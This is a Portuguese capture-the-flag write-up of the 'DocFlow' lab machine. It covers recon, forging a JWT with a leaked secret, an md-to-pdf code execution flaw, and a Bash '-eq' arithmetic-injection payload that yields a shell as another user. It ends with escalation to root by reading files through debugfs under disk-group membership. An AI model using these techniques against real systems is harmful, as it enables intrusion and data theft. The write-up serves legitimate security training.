# DocFlow

![DocFlow](/images/hackingclub-docflow/file-docflow-2025-1.png)

## Sumário

A vulnerabilidade inicial foi identificada em uma biblioteca `md-to-pdf`, permitindo a execução de código. A partir disso, realizou-se a movimentação lateral por meio de um `script em shell` que utilizava o operador `-eq` sem sanitização adequada da entrada do usuário. Por fim, a escalada de privilégios ocorreu devido à associação indevida do usuário ao grupo `disk`, possibilitando acesso direto aos dispositivos de bloco e comprometimento total do sistema.

## Recon do Alvo

### Varredura de portas

Utilizamos a ferramenta nmap para a identificação das portas abertas.

```bash
nmap -sV -Pn -T4 -p- docflow.hc
```

**Resultado**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
```

## Fuzzing

Enumeramos o host para encontrar diretórios e arquivos expostos.

```bash
ffuf -u http://docflow.hc/FUZZ -w /path/to/wordlist -ic -c -fs 267
```

> ℹ️ -ic → Ignora maiúsculas/minúsculas no matching<br>
> ℹ️ -c → Ativa output colorido<br>
> ℹ️ -fs 267 → Filtra (oculta) respostas com tamanho 267 bytes<br>
{: .prompt-info}

![Fuzzing](/images/hackingclub-docflow/file-docflow-2025-2.png)

## Explorando a vulnerabilidade

Ao acessar a aplicação principal, identificou-se que se trata de um serviço responsável pela conversão de textos em Markdown para PDF. No entanto, a funcionalidade de conversão completa é restrita a usuários do plano `Premium`. Durante a análise do fluxo de autenticação, foi possível observar que o token JWT utilizado pela aplicação contém, em sua payload, o campo `"is_premium": false`, responsável por controlar o acesso às funcionalidades avançadas.

![Aplication](/images/hackingclub-docflow/file-docflow-2025-3.png)

Em ambientes Node.js, é comum que configurações sensíveis — como `secrets` utilizadas para assinatura de tokens, chaves de API e parâmetros de banco de dados — sejam definidas em arquivos de configuração. Caso essas informações não sejam corretamente protegidas, podem ser inadvertidamente expostas ao cliente. Ao inspecionar o código-fonte disponibilizado pela aplicação no navegador, constatou-se a presença da chave secreta utilizada para assinatura dos tokens, evidenciando uma falha de configuração que expõe informações sensíveis da aplicação.

![Secret](/images/hackingclub-docflow/file-docflow-2025-4.png)

### Token JWT

Ao modificar a payload do token para definir `"is_premium": true` e substituí-lo pelo valor utilizado pelo navegador — armazenado no local storage — a interface passou a exibir as funcionalidades originalmente restritas ao plano Premium.

![Token](/images/hackingclub-docflow/file-docflow-2025-5.png)
![Premium](/images/hackingclub-docflow/file-docflow-2025-6.png)

## Obtendo a shell reversa

Durante a etapa de fuzzing no host, foi identificado que o arquivo `package.json` estava acessível publicamente. Esse arquivo expõe informações internas da aplicação, incluindo as versões específicas das dependências utilizadas no ambiente Node.js. Considerando que o sistema realiza a conversão de conteúdo Markdown para PDF, chamou atenção a presença da biblioteca responsável por essa funcionalidade `md-to-pdf`. Com base nessa descoberta, torna-se possível realizar uma análise direcionada de segurança, verificando se a versão da biblioteca md-to-pdf em uso apresenta vulnerabilidades conhecidas.

![File package.json](/images/hackingclub-docflow/file-docflow-2025-7.png)

### Referência

- [md-to-pdf vulnerable to arbitrary JavaScript code execution when parsing front matter](https://github.com/advisories/GHSA-547r-qmjm-8hvw?utm_source=chatgpt.com)

> ⚠️ Lembre-se de alterar a payload para obter a shell reversa.
{: .prompt-warning}

## Movimentação Lateral

Após obtermos uma shell no servidor, verificamos as permissões de `sudo` utilizando o comando `sudo -l`. Foi identificado que era possível executar um determinado script shell (.sh) com o usuário `axel`. Diante disso, realizamos a leitura do script com o objetivo de compreender seu funcionamento e identificar possíveis vetores de exploração.

![Binário Axel](/images/hackingclub-docflow/file-docflow-2025-8.png)

### Análise do script shell

Durante a análise do script, foi identificado o uso incorreto do operador `-eq` em Bash. Como esse operador é destinado exclusivamente a comparações numéricas, sua utilização sem validação adequada pode ser explorada, permitindo contornar verificações internas do script e executar ações com os privilégios do usuário `axel`, dono do arquivo.

### Referência

- [Bash eq Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/bash-eq/)

```bash
#! /bin/bash

echo "=== Security Check ==="
read -rp "Insert access key: " num

if [[ $num -eq 42 ]]
then 
	echo "[+] Authentication successful"
	echo "[*] Elevating privileges ... "
else
	echo "[-] Invalid key"
fi
```

> ❌ À primeira vista, o script aparenta ser inofensivo, pois apenas compara se a entrada do usuário é igual a 42 e exibe mensagens na tela. No entanto, ao analisá-lo com mais atenção, observa-se que o uso incorreto de funções e configurações inadequadas pode introduzir vulnerabilidades que possibilitam a movimentação lateral dentro do servidor.

{: .prompt-danger}

1 - Executamos o script utilizando sudo, especificando o usuário axel, a fim de obter as permissões necessárias para sua execução.

```bash
sudo -u axel /opt/check.sh
```

2 - Colocamos a payload a fim de obter a shell do usuário `axel`.

```bash
a[$(/bin/sh >&2)]+42
```

> ℹ️ a[...]<br>
	→ Indica o acesso a uma posição de um array no Bash.<br>
	→ O conteúdo dentro dos colchetes é avaliado primeiro.<br>
> ℹ️ $(...)<br>
	→ É substituição de comando.<br>
	→ Tudo que está dentro é executado pelo shell antes de continuar.<br>
> ℹ️ /bin/sh<br>
	→ Abre uma shell do sistema.<br>
	→ Quando o script roda com sudo, essa shell herda os privilégios do usuário alvo (ex.: axel).<br>
> ℹ️ >&2<br>
	→ Redireciona a saída da shell para o stderr.<br>
	→ Evita que a saída interfira na lógica do script.<br>
	→ Não impede a execução da shell, apenas redireciona a saída.<br>
> ℹ️ +42<br>
	→ Força o Bash a tratar toda a expressão como aritmética.<br>
	→ Isso ativa a expansão aritmética, permitindo a execução do comando embutido.<br>
{: .prompt-info}

![Axel](/images/hackingclub-docflow/file-docflow-2025-9.png)

## Elevando os privilégios

Conforme observado na imagem anterior, ao executar o comando `id`, é possível identificar que o usuário axel pertence ao grupo `disk (GID 6)`. Essa associação permite o uso da ferramenta `debugfs` para acessar e ler arquivos e diretórios diretamente a partir do `dispositivo de disco`, resultando em privilégios elevados e possibilitando a leitura de dados que normalmente não seriam acessíveis a um usuário comum.

### Referência

- [Disk Group Privilege Escalation](https://www.hackingarticles.in/disk-group-privilege-escalation/)

Dado que o usuário pertence ao grupo disk, é possível acessar diretamente os dispositivos de bloco do sistema. Com isso, podemos identificar as partições do disco listando os dispositivos `NVMe` presentes no diretório `/dev`, conforme demonstrado abaixo:

```bash
ls -l /dev/nvme*
```

Os arquivos listados representam os discos físicos e suas respectivas partições (por exemplo, `/dev/nvme0n1`, `/dev/nvme0n1p1`, `/dev/nvme0n1p2`). A partir dessa identificação, torna-se viável utilizar ferramentas de baixo nível, como o `debugfs`, para inspecionar o conteúdo das partições diretamente, ignorando as permissões tradicionais do sistema de arquivos e possibilitando a leitura de dados sensíveis. Neste cenário, a partição `/dev/nvme0n1p1` corresponde ao sistema de arquivos raiz `(/)`.

![NVME](/images/hackingclub-docflow/file-docflow-2025-10.png)

1 - Executamos o debugfs na partição raiz.

```bash
debugfs /dev/nvme0n1p1
```

2 - Para ver os comandos suportados pela ferramenta, basta executar `?`. Com isso, podemos ler os arquivos da pasta root.

```bash
ls /root ; cat /root/root.txt
```

![Root](/images/hackingclub-docflow/file-docflow-2025-11.png)

> ⚠️ O grupo disk permite ler e escrever diretamente em dispositivos de bloco como /dev/sda, ignorando completamente:<br>
	→ permissões de arquivos (rwx)<br>
	→ ownership (user:group)<br>
	→ ACLs<br>
	→ controles do sistema operacional em nível de arquivo<br>
Ou seja, o kernel não aplica as restrições normais quando o acesso ocorre diretamente no dispositivo.<br>
{: .prompt-warning}

> ⚠️ Ferramentas como o debugfs operam diretamente sobre sistemas de arquivos (ex.: ext4). Com acesso ao disco, é possível:<br>
	→ ler arquivos sensíveis (/root/.ssh/id_rsa)<br>
	→ navegar em diretórios protegidos (/root)<br>
	→ copiar arquivos do sistema para locais acessíveis<br>
	→ alterar metadados e conteúdos de arquivos<br>
Tudo isso sem necessidade de sudo.<br>
{: .prompt-warning}